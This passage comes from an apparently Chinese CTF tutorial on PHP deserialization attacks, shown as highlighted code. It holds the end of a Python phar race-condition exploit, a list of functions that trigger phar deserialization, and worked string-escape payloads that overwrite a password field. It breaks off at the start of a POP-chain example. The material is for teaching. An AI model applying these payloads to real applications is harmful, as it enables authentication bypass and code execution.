+<span class="line" data-line="28"><span style="color:#E1E4E8">        u</span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> threading.Thread(</span><span style="color:#FFAB70">target</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">unlinkPhar,</span><span style="color:#FFAB70">args</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">(url</span><span style="color:#F97583">+</span><span style="color:#9ECBFF">'?fn=phar://phar.phar/test'</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'1'</span><span style="color:#E1E4E8">))</span></span>
+<span class="line" data-line="29"><span style="color:#E1E4E8">        w.start()</span></span>
+<span class="line" data-line="30"><span style="color:#E1E4E8">        u.start()</span></span>
+<span class="line" data-line="31"><span style="color:#F97583">if</span><span style="color:#79B8FF"> __name__</span><span style="color:#F97583"> ==</span><span style="color:#9ECBFF"> '__main__'</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="32"><span style="color:#E1E4E8">    main()</span></span></code></pre>
+<p>除了 <code>file_put_contents</code> 外，会把 <code>phar</code> 反序列化的函数还有：</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>受影响的函数列表</th><th></th><th></th><th></th></tr></thead><tbody><tr><td><code>filename</code></td><td><code>filectime</code></td><td><code>file_exists</code></td><td><code>file_get_contents</code></td></tr><tr><td><code>file_put_contents</code></td><td><code>file</code></td><td><code>filegroup</code></td><td><code>fopen</code></td></tr><tr><td><code>fileinode</code></td><td><code>filemtime</code></td><td><code>fileowner</code></td><td><code>fileperms</code></td></tr><tr><td><code>is_dir</code></td><td><code>is_executable</code></td><td><code>is_file</code></td><td><code>is_link</code></td></tr><tr><td><code>is_readable</code></td><td><code>is_writable</code></td><td><code>is_writeable</code></td><td><code>parse_ini_file</code></td></tr><tr><td><code>copy</code></td><td><code>unlink</code></td><td><code>stat</code></td><td><code>readfile</code></td></tr></tbody></table>
+<h2 id="字符串逃逸">字符串逃逸</h2>
+<p>如果当开发者先将对象 <code>序列化</code> ，然后将对象中的字符进行 <code>过滤</code> ，最后再进行 <code>反序列化</code>。这个时候就有可能会产生PHP反序列化字符逃逸的漏洞。</p>
+<p>字符串逃逸基本就是两种情况，字符变多or字符变少，总之本地多调试吧…</p>
+<p><strong>字符变多</strong></p>
+<ol>
+<li>看过滤,判断字符变多还是字符变少,计算变化个数</li>
+<li>一个字符，构造过滤字符的个数为构造的字符长度</li>
+<li>n个字符，构造过滤字符的个数为构造的字符长度/n</li>
+</ol>
+<p><strong>字符变少</strong></p>
+<ol>
+<li>构造想要的值正常序列化，拿到最终的逃逸字符</li>
+<li>逃逸字符前任意字符+双引号闭合，传入要控制的值</li>
+<li>根据需要逃逸的字符串的长度，传入对应的过滤字符</li>
+</ol>
+<h3 id="字符变多">字符变多</h3>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line" data-line="2"><span style="color:#F97583">include</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'flag.php'</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="3"><span style="color:#F97583">function</span><span style="color:#B392F0"> filter</span><span style="color:#E1E4E8">($s) {</span></span>
+<span class="line" data-line="4"><span style="color:#F97583">    return</span><span style="color:#79B8FF"> str_replace</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'admin'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'hacker'</span><span style="color:#E1E4E8">, $s);</span></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="6"></span>
+<span class="line" data-line="7"><span style="color:#F97583">class</span><span style="color:#B392F0"> ctf</span><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="8"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $username;</span></span>
+<span class="line" data-line="9"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $password;</span></span>
+<span class="line" data-line="10"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#79B8FF"> __construct</span><span style="color:#E1E4E8">($username, $password){</span></span>
+<span class="line" data-line="11"><span style="color:#79B8FF">        $this</span><span style="color:#F97583"> -></span><span style="color:#E1E4E8"> username </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $username;</span></span>
+<span class="line" data-line="12"><span style="color:#79B8FF">        $this</span><span style="color:#F97583"> -></span><span style="color:#E1E4E8"> password </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $password;</span></span>
+<span class="line" data-line="13"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="14"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#79B8FF"> __wakeup</span><span style="color:#E1E4E8">(){</span></span>
+<span class="line" data-line="15"><span style="color:#F97583">        if</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">$this</span><span style="color:#F97583"> -></span><span style="color:#E1E4E8"> password </span><span style="color:#F97583">==</span><span style="color:#9ECBFF"> '88888888'</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line" data-line="16"><span style="color:#79B8FF">            echo</span><span style="color:#E1E4E8"> $flag;</span></span>
+<span class="line" data-line="17"><span style="color:#F97583">            die</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="18"><span style="color:#E1E4E8">        }</span></span>
+<span class="line" data-line="19"><span style="color:#79B8FF">        echo</span><span style="color:#9ECBFF"> 'Fake admin'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="20"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="21"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="22"></span>
+<span class="line" data-line="23"><span style="color:#E1E4E8">$u </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $_GET[</span><span style="color:#9ECBFF">'u'</span><span style="color:#E1E4E8">];</span></span>
+<span class="line" data-line="24"><span style="color:#E1E4E8">$p </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $_GET[</span><span style="color:#9ECBFF">'p'</span><span style="color:#E1E4E8">];</span></span>
+<span class="line" data-line="25"></span>
+<span class="line" data-line="26"><span style="color:#F97583">if</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">strpos</span><span style="color:#E1E4E8">($u, </span><span style="color:#9ECBFF">'admin'</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">!==</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">){</span></span>
+<span class="line" data-line="27"><span style="color:#E1E4E8">    $data </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#79B8FF"> ctf</span><span style="color:#E1E4E8">($u, $p);</span></span>
+<span class="line" data-line="28"><span style="color:#79B8FF">    unserialize</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">filter</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">serialize</span><span style="color:#E1E4E8">($data)));</span></span>
+<span class="line" data-line="29"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p>这段代码中 <code>$u</code> 必须包含 <code>admin</code>，然后把 <code>admin</code> 替换为 <code>hacker</code> 其次通过判断 <code>password</code> 是否等于 <code>8888888</code> 来判断是否输出 <code>flag</code></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line" data-line="2"></span>
+<span class="line" data-line="3"><span style="color:#F97583">function</span><span style="color:#B392F0"> filter</span><span style="color:#E1E4E8">($s) {</span></span>
+<span class="line" data-line="4"><span style="color:#F97583">    return</span><span style="color:#79B8FF"> str_replace</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'admin'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'hacker'</span><span style="color:#E1E4E8">, $s);</span></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="6"></span>
+<span class="line" data-line="7"><span style="color:#F97583">class</span><span style="color:#B392F0"> ctf</span><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="8"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $username;</span></span>
+<span class="line" data-line="9"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $password </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> '88888888'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="10"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#79B8FF"> __construct</span><span style="color:#E1E4E8">($username){</span></span>
+<span class="line" data-line="11"><span style="color:#79B8FF">        $this</span><span style="color:#F97583"> -></span><span style="color:#E1E4E8"> username </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $username;</span></span>
+<span class="line" data-line="12"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="13"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="14"></span>
+<span class="line" data-line="15"><span style="color:#E1E4E8">$u </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> 'admin'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="16"><span style="color:#E1E4E8">$data </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#79B8FF"> ctf</span><span style="color:#E1E4E8">($u);</span></span>
+<span class="line" data-line="17"></span>
+<span class="line" data-line="18"><span style="color:#79B8FF">var_dump</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">filter</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">serialize</span><span style="color:#E1E4E8">($data)));</span></span></code></pre>
+<p>先给 <code>username</code> 赋值 <code>admin</code> ，然后把 <code>password</code> 改为 <code>88888888</code>，观察一下返回的数据</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>O:3:"ctf":2:{s:8:"username";s:5:"hacker";s:8:"password";s:8:"88888888";}</span></span></code></pre>
+<p>经过替换后 <code>admin</code> 变成了 <code>hacker</code> ，多出来了一个字符，但标记长度没有变化，还是 <code>s:5</code> ，造成了实际长度大于标记长度的情况，从而反序列化失败。</p>
+<p>同时我们发现后面我们需要构造的字符 <code>";s:8:"password";s:8:"88888888";}</code> 长度为 <code>33</code> ，由于过滤规则每次替换增加 <code>1</code> 个字符，所以我们需要 <code>33</code> 个 <code>admin</code></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line" data-line="2"></span>
+<span class="line" data-line="3"><span style="color:#F97583">function</span><span style="color:#B392F0"> filter</span><span style="color:#E1E4E8">($s) {</span></span>
+<span class="line" data-line="4"><span style="color:#F97583">    return</span><span style="color:#79B8FF"> str_replace</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'admin'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'hacker'</span><span style="color:#E1E4E8">, $s);</span></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="6"></span>
+<span class="line" data-line="7"><span style="color:#F97583">class</span><span style="color:#B392F0"> ctf</span><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="8"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $username </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> 'adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin";s:8:"password";s:8:"88888888";}'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="9"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $password </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> '88888888'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="10"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="11"></span>
+<span class="line" data-line="12"><span style="color:#E1E4E8">$a </span><span style="color:#F97583">=</span><span style="color:#B392F0"> filter</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">serialize</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">new</span><span style="color:#79B8FF"> ctf</span><span style="color:#E1E4E8">()));</span></span>
+<span class="line" data-line="13"><span style="color:#79B8FF">echo</span><span style="color:#E1E4E8"> $a;</span></span></code></pre>
+<p>得到如下字符串，</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>O:3:"ctf":2:{s:8:"username";s:198:"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker";s:8:"password";s:8:"88888888";}";s:8:"password";s:8:"88888888";}</span></span></code></pre>
+<p>我们发现 <code>hacker</code> 正好是 <code>198</code> 个字符，而 <code>password</code> 也变成了我们想要的 <code>88888888</code></p>
+<h3 id="字符变少">字符变少</h3>
+<p>简单改一下上题的代码，<code>admin</code> 替换为 <code>hack</code></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line" data-line="2"><span style="color:#F97583">include</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'flag.php'</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="3"><span style="color:#F97583">function</span><span style="color:#B392F0"> filter</span><span style="color:#E1E4E8">($s) {</span></span>
+<span class="line" data-line="4"><span style="color:#F97583">    return</span><span style="color:#79B8FF"> str_replace</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'admin'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'hack'</span><span style="color:#E1E4E8">, $s);</span></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="6"></span>
+<span class="line" data-line="7"><span style="color:#F97583">class</span><span style="color:#B392F0"> ctf</span><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="8"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $username;</span></span>
+<span class="line" data-line="9"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $password;</span></span>
+<span class="line" data-line="10"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#79B8FF"> __construct</span><span style="color:#E1E4E8">($username, $password){</span></span>
+<span class="line" data-line="11"><span style="color:#79B8FF">        $this</span><span style="color:#F97583"> -></span><span style="color:#E1E4E8"> username </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $username;</span></span>
+<span class="line" data-line="12"><span style="color:#79B8FF">        $this</span><span style="color:#F97583"> -></span><span style="color:#E1E4E8"> password </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $password;</span></span>
+<span class="line" data-line="13"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="14"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#79B8FF"> __wakeup</span><span style="color:#E1E4E8">(){</span></span>
+<span class="line" data-line="15"><span style="color:#F97583">        if</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">$this</span><span style="color:#F97583"> -></span><span style="color:#E1E4E8"> password </span><span style="color:#F97583">==</span><span style="color:#9ECBFF"> '88888888'</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line" data-line="16"><span style="color:#79B8FF">            echo</span><span style="color:#E1E4E8"> $flag;</span></span>
+<span class="line" data-line="17"><span style="color:#F97583">            die</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="18"><span style="color:#E1E4E8">        }</span></span>
+<span class="line" data-line="19"><span style="color:#79B8FF">        echo</span><span style="color:#9ECBFF"> 'Fake admin'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="20"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="21"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="22"></span>
+<span class="line" data-line="23"><span style="color:#E1E4E8">$u </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $_GET[</span><span style="color:#9ECBFF">'u'</span><span style="color:#E1E4E8">];</span></span>
+<span class="line" data-line="24"><span style="color:#E1E4E8">$p </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $_GET[</span><span style="color:#9ECBFF">'p'</span><span style="color:#E1E4E8">];</span></span>
+<span class="line" data-line="25"></span>
+<span class="line" data-line="26"><span style="color:#F97583">if</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">strpos</span><span style="color:#E1E4E8">($u, </span><span style="color:#9ECBFF">'admin'</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">!==</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">){</span></span>
+<span class="line" data-line="27"><span style="color:#E1E4E8">    $data </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#79B8FF"> ctf</span><span style="color:#E1E4E8">($u, $p);</span></span>
+<span class="line" data-line="28"><span style="color:#79B8FF">    unserialize</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">filter</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">serialize</span><span style="color:#E1E4E8">($data)));</span></span>
+<span class="line" data-line="29"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p>思路同上，先输出一下 <code>serialize</code> 后的数据</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>O:3:"ctf":2:{s:8:"username";s:4:"hack";s:8:"password";s:8:"88888888";}</span></span></code></pre>
+<p>发现 <code>admin</code> 变成了 <code>hack</code> ，但是标记长度没有变化，还是 <code>s:4</code> ，造成了实际长度小于标记长度的情况，我们每增加一个 <code>admin</code> 匹配替换后就减少 <code>1</code> 个字符,我们要做的就是让他往后去吞噬一些我们构造的代码，这样就可以构造出我们想要的代码了。</p>
+<p>这样是我们想要构造的代码</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>";s:8:"password";s:8:"88888888";}</span></span></code></pre>
+<p>我们把它传入 <code>password</code> 中观察返回数据</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line" data-line="2"></span>
+<span class="line" data-line="3"><span style="color:#F97583">function</span><span style="color:#B392F0"> filter</span><span style="color:#E1E4E8">($s) {</span></span>
+<span class="line" data-line="4"><span style="color:#F97583">    return</span><span style="color:#79B8FF"> str_replace</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'admin'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'hack'</span><span style="color:#E1E4E8">, $s);</span></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="6"></span>
+<span class="line" data-line="7"><span style="color:#F97583">class</span><span style="color:#B392F0"> ctf</span><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="8"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $username </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> 'admin'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="9"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $password </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> '";s:8:"password";s:8:"88888888";}'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="10"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="11"></span>
+<span class="line" data-line="12"><span style="color:#E1E4E8">$a </span><span style="color:#F97583">=</span><span style="color:#B392F0"> filter</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">serialize</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">new</span><span style="color:#79B8FF"> ctf</span><span style="color:#E1E4E8">()));</span></span>
+<span class="line" data-line="13"><span style="color:#79B8FF">echo</span><span style="color:#E1E4E8"> $a;</span></span></code></pre>
+<p>得到如下字符串</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>O:3:"ctf":2:{s:8:"username";s:5:"hack";s:8:"password";s:33:"";s:8:"password";s:8:"88888888";}";}</span></span></code></pre>
+<p>所以我们需要吞噬的字符如下</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>";s:8:"password";s:33:"</span></span></code></pre>
+<p>由于每次匹配替换只会减少一个字符，所以我们需要构造一个长度为 <code>23</code> 的字符串，这样就可以吞噬到我们想要的代码了。</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line" data-line="2"></span>
+<span class="line" data-line="3"><span style="color:#F97583">function</span><span style="color:#B392F0"> filter</span><span style="color:#E1E4E8">($s) {</span></span>
+<span class="line" data-line="4"><span style="color:#F97583">    return</span><span style="color:#79B8FF"> str_replace</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'admin'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'hack'</span><span style="color:#E1E4E8">, $s);</span></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="6"></span>
+<span class="line" data-line="7"><span style="color:#F97583">class</span><span style="color:#B392F0"> ctf</span><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="8"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $username </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> 'adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="9"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $password </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> '";s:8:"password";s:8:"88888888";}'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="10"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="11"></span>
+<span class="line" data-line="12"><span style="color:#E1E4E8">$a </span><span style="color:#F97583">=</span><span style="color:#B392F0"> filter</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">serialize</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">new</span><span style="color:#79B8FF"> ctf</span><span style="color:#E1E4E8">()));</span></span>
+<span class="line" data-line="13"><span style="color:#79B8FF">echo</span><span style="color:#E1E4E8"> $a;</span></span></code></pre>
+<p>得到如下字符串</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>O:3:"ctf":2:{s:8:"username";s:115:"hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack";s:8:"password";s:33:"";s:8:"password";s:8:"88888888";}";}</span></span></code></pre>
+<h2 id="pop链构造">POP链构造</h2>
+<p>目前在 CTF 竞赛中，基本遇到的 PHP 反序列化题目都是POP链构造。<code>POP</code> 大家可以当成 <code>Misc</code> 中的套娃题，需要多次利用魔法方法实现跳转最后实现恶意的代码，从方法到方法的跳转的精妙构造，最后看起来的效果就像一条链子一样，所以我们叫它 <code>POP链</code></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line" data-line="2"><span style="color:#79B8FF">highlight_file</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">__FILE__</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="3"></span>
+<span class="line" data-line="4"><span style="color:#F97583">class</span><span style="color:#B392F0"> blue</span></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="6"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $b1;</span></span>
+<span class="line" data-line="7"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $b2;</span></span>
+<span class="line" data-line="8"></span>
+<span class="line" data-line="9"><span style="color:#F97583">    function</span><span style="color:#B392F0"> eval</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line" data-line="10"><span style="color:#79B8FF">        echo</span><span style="color:#F97583"> new</span><span style="color:#E1E4E8"> $this</span><span style="color:#F97583">-></span><span style="color:#B392F0">b1</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">$this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">b2);</span></span>
+<span class="line" data-line="11"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="12"></span>
+<span class="line" data-line="13"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#79B8FF"> __invoke</span><span style="color:#E1E4E8">()</span></span>
+<span class="line" data-line="14"><span style="color:#E1E4E8">    {</span></span>
+<span class="line" data-line="15"><span style="color:#79B8FF">        $this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">b1</span><span style="color:#F97583">-></span><span style="color:#B392F0">blue</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="16"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="17"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="18"></span>
+<span class="line" data-line="19"><span style="color:#F97583">class</span><span style="color:#B392F0"> red</span></span>
+<span class="line" data-line="20"><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="21"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $r1;</span></span>
+<span class="line" data-line="22"></span>
+<span class="line" data-line="23"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#79B8FF"> __destruct</span><span style="color:#E1E4E8">()</span></span>
+<span class="line" data-line="24"><span style="color:#E1E4E8">    {</span></span>
+<span class="line" data-line="25"><span style="color:#79B8FF">        echo</span><span style="color:#79B8FF"> $this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">r1 </span><span style="color:#F97583">.</span><span style="color:#9ECBFF"> '0xff0000'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="26"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="27"></span>
+<span class="line" data-line="28"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#B392F0"> execute</span><span style="color:#E1E4E8">()</span></span>
+<span class="line" data-line="29"><span style="color:#E1E4E8">    {</span></span>
+<span class="line" data-line="30"><span style="color:#E1E4E8">        (</span><span style="color:#79B8FF">$this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">r1)();</span></span>
+<span class="line" data-line="31"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="32"></span>
+<span class="line" data-line="33"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#79B8FF"> __call</span><span style="color:#E1E4E8">($a, $b)</span></span>
+<span class="line" data-line="34"><span style="color:#E1E4E8">    {</span></span>
+<span class="line" data-line="35"><span style="color:#79B8FF">        echo</span><span style="color:#79B8FF"> $this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">r1</span><span style="color:#F97583">-></span><span style="color:#B392F0">getFlag</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="36"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="37"></span>
+<span class="line" data-line="38"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="39"></span>
+<span class="line" data-line="40"><span style="color:#F97583">class</span><span style="color:#B392F0"> white</span></span>
+<span class="line" data-line="41"><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="42"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $w;</span></span>
+<span class="line" data-line="43"></span>
+<span class="line" data-line="44"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#79B8FF"> __toString</span><span style="color:#E1E4E8">()</span></span>
+<span class="line" data-line="45"><span style="color:#E1E4E8">    {</span></span>
+<span class="line" data-line="46"><span style="color:#79B8FF">        $this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">w</span><span style="color:#F97583">-></span><span style="color:#B392F0">execute</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="47"><span style="color:#F97583">        return</span><span style="color:#9ECBFF"> 'hello'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="48"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="49"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="50"><span style="color:#F97583">class</span><span style="color:#B392F0"> color</span></span>
+<span class="line" data-line="51"><span style="color:#E1E4E8">{</span></span>
